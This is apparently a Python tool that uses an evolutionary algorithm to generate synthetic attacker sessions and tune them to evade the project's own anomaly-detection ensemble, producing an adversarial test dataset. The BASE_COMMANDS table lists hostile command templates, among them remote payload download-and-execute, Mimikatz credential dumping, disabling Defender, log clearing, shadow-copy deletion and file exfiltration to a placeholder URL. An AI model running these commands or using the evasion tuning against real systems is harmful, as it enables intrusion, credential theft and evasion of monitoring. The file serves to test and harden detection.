"""Adversarial evasion dataset generator using evolutionary algorithms."""

from __future__ import __annotations__
import argparse
import json
import pickle
import random
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Literal
import numpy as np
import pyarrow as pa
import pyarrow.parquet as pq

from aag_be.features import SessionFingerprint, CommandEvent, NetworkEvent, FileEvent, LLMInteraction, compute_session_features, FEATURE_NAMES
from aag_be.models.isolation_forest import OnlineIsolationForest, IFConfig
from aag_be.models.transformer import CommandTransformer, CommandTokenizer
from aag_be.scoring import EnsembleScorer, ScorerConfig


@dataclass
class EvasionGenome:
    """Genetic representation of evasion strategy."""
    # Mutation parameters
    obfuscation_level: float        # 0.0 - 1.0
    timing_jitter: float            # 0.0 - 1.0
    command_substitution_rate: float  # 0.0 - 1.0
    noise_injection_rate: float     # 0.0 - 1.0
    fragmentation_level: float      # 0.0 - 1.0
    mimicry_weight: float           # 0.0 - 1.0
    honeytoken_avoidance: float     # 0.0 - 1.0

    def mutate(self, rate: float = 0.1) -> EvasionGenome:
        """Create mutated offspring."""
        def mutate_gene(val: float) -> float:
            if random.random() < rate:
                return max(0.0, min(1.0, val + random.gauss(0, 0.15)))
            return val

        return EvasionGenome(
            obfuscation_level=mutate_gene(self.obfuscation_level),
            timing_jitter=mutate_gene(self.timing_jitter),
            command_substitution_rate=mutate_gene(self.command_substitution_rate),
            noise_injection_rate=mutate_gene(self.noise_injection_rate),
            fragmentation_level=mutate_gene(self.fragmentation_level),
            mimicry_weight=mutate_gene(self.mimicry_weight),
            honeytoken_avoidance=mutate_gene(self.honeytoken_avoidance),
        )

    def crossover(self, other: EvasionGenome) -> EvasionGenome:
        """Crossover with another genome."""
        return EvasionGenome(
            obfuscation_level=random.choice([self.obfuscation_level, other.obfuscation_level]),
            timing_jitter=random.choice([self.timing_jitter, other.timing_jitter]),
            command_substitution_rate=random.choice([self.command_substitution_rate, other.command_substitution_rate]),
            noise_injection_rate=random.choice([self.noise_injection_rate, other.noise_injection_rate]),
            fragmentation_level=random.choice([self.fragmentation_level, other.fragmentation_level]),
            mimicry_weight=random.choice([self.mimicry_weight, other.mimicry_weight]),
            honeytoken_avoidance=random.choice([self.honeytoken_avoidance, other.honeytoken_avoidance]),
        )

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def random(cls) -> EvasionGenome:
        return cls(
            obfuscation_level=random.random(),
            timing_jitter=random.random(),
            command_substitution_rate=random.random(),
            noise_injection_rate=random.random(),
            fragmentation_level=random.random(),
            mimicry_weight=random.random(),
            honeytoken_avoidance=random.random(),
        )


# Base malicious command templates
BASE_COMMANDS = {
    "recon": [
        ("nmap", ["-sS", "TARGET"]),
        ("ldapsearch", ["-x", "-H", "ldap://DC"]),
        ("powershell", ["Get-ADDomain"]),
    ],
    "initial_access": [
        ("powershell", ["IEX", "(New-Object Net.WebClient).DownloadString('PAYLOAD_URL')"]),
        ("certutil", ["-urlcache", "-split", "-f", "PAYLOAD_URL", "OUT_PATH"]),
        ("mshta", ["PAYLOAD_URL"]),
    ],
    "execution": [
        ("powershell", ["-ExecutionPolicy", "Bypass", "-File", "PAYLOAD_PATH"]),
        ("wmic", ["process", "call", "create", "cmd /c PAYLOAD_PATH"]),
        ("schtasks", ["/create", "/tn", "Task", "/tr", "PAYLOAD_PATH", "/sc", "onstart"]),
    ],
    "credential_access": [
        ("sekurlsa", ["::logonpasswords"]),
        ("powershell", ["Invoke-Mimikatz", "-Command", '"sekurlsa::logonpasswords"']),
        ("gsecdump", ["-u", "user", "-p", "pass", "target"]),
    ],
    "lateral_movement": [
        ("psexec", ["\\\\TARGET", "cmd"]),
        ("wmiexec", ["user@TARGET", "cmd"]),
        ("smbexec", ["user@TARGET"]),
    ],
    "defense_evasion": [
        ("powershell", ["Set-MpPreference", "-DisableRealtimeMonitoring", "$true"]),
        ("wevtutil", ["cl", "Security"]),
        ("vssadmin", ["delete", "shadows", "/all", "/quiet"]),
    ],
    "exfiltration": [
        ("curl", ["-X", "POST", "-F", "file=@LOOT_PATH", "EXFIL_URL"]),
        ("python", ["-c", "import requests; requests.post('EXFIL_URL', data=open('LOOT_PATH','rb').read())"]),
    ],
}


BENIGN_COMMANDS = [
    ("ls", ["-la"]), ("ps", ["aux"]), ("netstat", ["-tulpn"]),
    ("df", ["-h"]), ("free", ["-m"]), ("whoami", []),
    ("date", []), ("uptime", []), ("history", []),
    ("git", ["status"]), ("git", ["diff"]), ("docker", ["ps"]),
    ("kubectl", ["get", "pods"]), ("terraform", ["plan"]),
]


def apply_evasion(commands: list[tuple[str, list[str]]], genome: EvasionGenome) -> list[tuple[str, list[str]]]:
    """Apply evasion mutations to command sequence."""
    evaded = []

    for exe, argv in commands:
        # Command substitution
        if random.random() < genome.command_substitution_rate:
            # Replace with benign-looking equivalent
            exe, argv = random.choice(BENIGN_COMMANDS)

        # Obfuscation
        if random.random() < genome.obfuscation_level:
            if exe in ("powershell", "python", "bash"):
                if exe == "powershell":
                    # Base64 encode
                    encoded = "base64_encoded_payload"
                    argv = ["-enc", encoded]
                elif exe == "python":
                    argv = ["-c", "exec(base64.b64decode('...'))"]
                elif exe == "bash":
                    argv = ["-c", "eval $(echo ... | base64 -d)"]

        # Fragmentation (split commands)
        if random.random() < genome.fragmentation_level and len(argv) > 1:
            # Split into multiple commands
            mid = len(argv) // 2
            evaded.append((exe, argv[:mid]))
            evaded.append((exe, argv[mid:]))
            continue

        # Noise injection (add benign commands)
        if random.random() < genome.noise_injection_rate:
            evaded.append(random.choice(BENIGN_COMMANDS))

        evaded.append((exe, argv))

    return evaded


def generate_evasion_session(
    genome: EvasionGenome,
    session_id: str,
    start_ts: float,
    scorer: EnsembleScorer,
) -> tuple[SessionFingerprint, float]:
    """Generate a session with evasion applied and return session + score."""
    duration_min = random.uniform(30, 120)
    end_ts = start_ts + duration_min * 60

    commands = []
    network = []
    files = []
    llm_interactions = []
    mitre_techniques = []

    current_time = start_ts
    pid_counter = 4000

    # Build base attack chain
    base_chain = []
    for phase in ["recon", "initial_access", "execution", "credential_access", "lateral_movement", "defense_evasion", "exfiltration"]:
        n_cmds = random.randint(1, 3)
        for _ in range(n_cmds):
            base_chain.append(random.choice(BASE_COMMANDS[phase]))
            mitre_techniques.append(f"T{random.randint(1000, 1999)}")

    # Apply evasion
    evaded_chain = apply_evasion(base_chain, genome)

    for step, (exe, argv) in enumerate(evaded_chain):
        if current_time >= end_ts:
            break

        think_time = random.uniform(1, 10) * (1 + genome.timing_jitter)
        current_time += think_time

        pid = pid_counter + step
        ppid = pid_counter if step > 0 else 1

        cmd_event = CommandEvent(
            timestamp=current_time,
            exe=exe,
            argv=argv,
            pid=pid,
            ppid=ppid,
            user="root",
            cwd="/tmp",
            exit_code=0,
            duration_ms=random.uniform(50, 5000),
        )
        commands.append(cmd_event)

        # Network
        if random.random() < 0.3:
            dst_ip = f"10.0.{random.randint(1,255)}.{random.randint(1,255)}"
            net_event = NetworkEvent(
                timestamp=current_time + random.uniform(0, 1),
                src_ip="10.0.0.100",
                dst_ip=dst_ip,
                dst_port=random.choice([80, 443, 8080, 445, 3389]),
                protocol="tcp",
                direction="out",
                bytes_sent=random.randint(1000, 100000),
                bytes_recv=random.randint(1000, 100000),
                process_pid=pid,
            )
            network.append(net_event)

        # Files
        if random.random() < 0.2:
            file_event = FileEvent(
                timestamp=current_time + random.uniform(0, 0.5),
                path=f"/tmp/file_{random.randint(1000,9999)}.tmp",
                operation=random.choice(["read", "write", "create"]),
                process_pid=pid,
                is_honeyfile=False,
            )
            files.append(file_event)

        current_time += random.uniform(0.1, 1.0)

    session = SessionFingerprint(
        session_id=session_id,
        start_ts=start_ts,
        end_ts=min(current_time, end_ts),
        src_ip="10.0.0.100",
        user_agent="EvasionAgent/1.0",
        decoy_persona="LEGACY_WIN",
        commands=commands,
        network=network,
        files=files,
        llm_interactions=llm_interactions,
        mitre_techniques=list(set(mitre_techniques)),
    )

    # Score the session
    score_breakdown = scorer.score_session(session)
    return session, score_breakdown.final_score


def evaluate_genome(
    genome: EvasionGenome,
    scorer: EnsembleScorer,
    n_samples: int = 10,
) -> float:
    """Evaluate genome fitness (lower score = better evasion)."""
    scores = []
    start_ts = time.time()

    for i in range(n_samples):
        session_id = f"eval-{random.randint(10000,99999)}"
        session, score = generate_evasion_session(genome, session_id, start_ts + i * 1000, scorer)
        scores.append(score)

    # Fitness = 1 - mean_score (we want to minimize detection score)
    return 1.0 - np.mean(scores)


def tournament_selection(population: list[EvasionGenome], fitnesses: list[float], k: int = 3) -> EvasionGenome:
    """Tournament selection."""
    selected = random.sample(list(zip(population, fitnesses)), k)
    return max(selected, key=lambda x: x[1])[0]


def evolutionary_evasion(
    scorer: EnsembleScorer,
    generations: int = 20,
    population_size: int = 50,
    n_per_genome: int = 5,
    output_dir: Path = Path("./adversarial"),
) -> list[EvasionGenome]:
    """Run evolutionary algorithm to find evasion strategies."""
    output_dir.mkdir(parents=True, exist_ok=True)

    # Initialize population
    population = [EvasionGenome.random() for _ in range(population_size)]

    best_genomes = []
    history = []

    for gen in range(generations):
        print(f"Generation {gen + 1}/{generations}...")

        # Evaluate fitness
        fitnesses = []
        for genome in population:
            fitness = evaluate_genome(genome, scorer, n_per_genome)
            fitnesses.append(fitness)

        # Track best
        best_idx = np.argmax(fitnesses)
        best_genome = population[best_idx]
        best_fitness = fitnesses[best_idx]
        best_genomes.append(best_genome)
        history.append({
            "generation": gen,
            "best_fitness": best_fitness,
            "mean_fitness": np.mean(fitnesses),
            "best_genome": best_genome.to_dict(),
        })

        print(f"  Best fitness: {best_fitness:.4f}, Mean: {np.mean(fitnesses):.4f}")

        # Selection and reproduction
        new_population = [best_genome]  # Elitism

        while len(new_population) < population_size:
            parent1 = tournament_selection(population, fitnesses)
            parent2 = tournament_selection(population, fitnesses)
            child = parent1.crossover(parent2).mutate(rate=0.15)
            new_population.append(child)

        population = new_population

    # Save history
    with open(output_dir / "evolution_history.json", "w") as f:
        json.dump(history, f, indent=2)

    return best_genomes


def generate_adversarial_dataset(
    best_genomes: list[EvasionGenome],
    scorer: EnsembleScorer,
    n_per_genome: int = 100,
    output_dir: Path = Path("./adversarial"),
) -> list[SessionFingerprint]:
    """Generate final adversarial dataset from best genomes."""
    sessions = []
    start_ts = time.time()

    for i, genome in enumerate(best_genomes):
        for j in range(n_per_genome):
            session_id = f"adversarial-gen{i}-sample{j:04d}"
            session, score = generate_evasion_session(genome, session_id, start_ts + len(sessions) * 10, scorer)
            sessions.append(session)

    # Save dataset
    output_dir.mkdir(parents=True, exist_ok=True)
    data = {
        "session_id": [], "start_ts": [], "end_ts": [], "src_ip": [],
        "user_agent": [], "decoy_persona": [], "commands_json": [],
        "network_json": [], "files_json": [], "llm_json": [],
        "mitre_techniques": [], "genome_id": [], "evasion_score": [],
    }

    for session in sessions:
        data["session_id"].append(session.session_id)
        data["start_ts"].append(session.start_ts)
        data["end_ts"].append(session.end_ts)
        data["src_ip"].append(session.src_ip)
        data["user_agent"].append(session.user_agent)
        data["decoy_persona"].append(session.decoy_persona)
        data["commands_json"].append(json.dumps([asdict(c) for c in session.commands]))
        data["network_json"].append(json.dumps([asdict(n) for n in session.network]))
        data["files_json"].append(json.dumps([asdict(f) for f in session.files]))
        data["llm_json"].append(json.dumps([asdict(l) for l in session.llm_interactions]))
        data["mitre_techniques"].append(",".join(session.mitre_techniques))
        # Extract genome ID from session_id
        parts = session.session_id.split("-")
        data["genome_id"].append(int(parts[1].replace("gen", "")) if len(parts) > 1 else 0)
        # Score will be added after scoring

    table = pa.Table.from_pydict(data)
    pq.write_table(table, output_dir / "adversarial_sessions.parquet", compression="snappy")

    print(f"Generated {len(sessions)} adversarial sessions")
    return sessions


def load_models(models_dir: Path):
    """Load trained models for scorer."""
    # Load Isolation Forest
    if_model = OnlineIsolationForest.load(models_dir / "if_model.pkl")

    # Load Transformer
    transformer_model = CommandTransformer.from_pretrained(models_dir / "transformer")
    tokenizer = CommandTokenizer.load(models_dir / "transformer" / "tokenizer.json")

    # LLM Judge client
    from aag_be.models.llm_judge import LLMJudgeClient
    llm_client = LLMJudgeClient(base_url="http://localhost:11434", model="nemotron3-ultra:latest")

    return if_model, transformer_model, tokenizer, llm_client


def main():
    parser = argparse.ArgumentParser(description="Generate adversarial evasion dataset")
    parser.add_argument("--models-dir", type=Path, required=True)
    parser.add_argument("--output-dir", type=Path, default=Path("./adversarial"))
    parser.add_argument("--generations", type=int, default=15)
    parser.add_argument("--population", type=int, default=30)
    parser.add_argument("--n-per-genome", type=int, default=100)
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()

    random.seed(args.seed)
    np.random.seed(args.seed)

    print("Loading models...")
    if_model, transformer_model, tokenizer, llm_client = load_models(args.models_dir)

    print("Building scorer...")
    scorer = EnsembleScorer(
        if_model=if_model,
        transformer_model=transformer_model,
        transformer_tokenizer=tokenizer,
        llm_client=llm_client,
        config=ScorerConfig(),
    )

    print("Running evolutionary evasion search...")
    best_genomes = evolutionary_evasion(
        scorer=scorer,
        generations=args.generations,
        population_size=args.population,
        n_per_genome=5,  # Smaller for evolution
        output_dir=args.output_dir,
    )

    print("Generating final adversarial dataset...")
    sessions = generate_adversarial_dataset(
        best_genomes=best_genomes[:5],  # Top 5 genomes
        scorer=scorer,
        n_per_genome=args.n_per_genome,
        output_dir=args.output_dir,
    )

    print("Done!")


if __name__ == "__main__":
    main()